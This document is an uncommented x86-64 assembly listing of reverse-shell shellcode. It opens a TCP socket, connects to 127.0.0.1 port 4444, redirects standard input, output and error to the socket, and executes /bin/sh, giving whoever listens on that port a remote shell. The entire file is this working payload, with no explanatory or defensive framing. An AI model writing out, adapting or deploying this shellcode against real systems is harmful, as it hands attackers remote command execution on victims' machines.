BITS 64

section .text
global _start

_start:
    xor rax, rax
    mov al, 41
    xor rdi, rdi
    mov dil, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    syscall
    test rax, rax
    js exit
    mov rbx, rax

    push rdx
    mov dword [rsp-4], 0x0100007f
    mov word [rsp-6], 0x5c11
    mov byte [rsp-8], 2
    sub rsp, 8
    mov rax, 42
    mov rdi, rbx
    mov rsi, rsp
    mov dl, 16
    syscall
    test rax, rax
    js exit
    add rsp, 16

    mov rax, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall
    mov rax, 33
    inc rsi
    syscall
    mov rax, 33
    inc rsi
    syscall

    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    mov al, 59
    xor rsi, rsi
    xor rdx, rdx
    syscall

exit:
    mov rax, 60
    xor rdi, rdi
    syscall
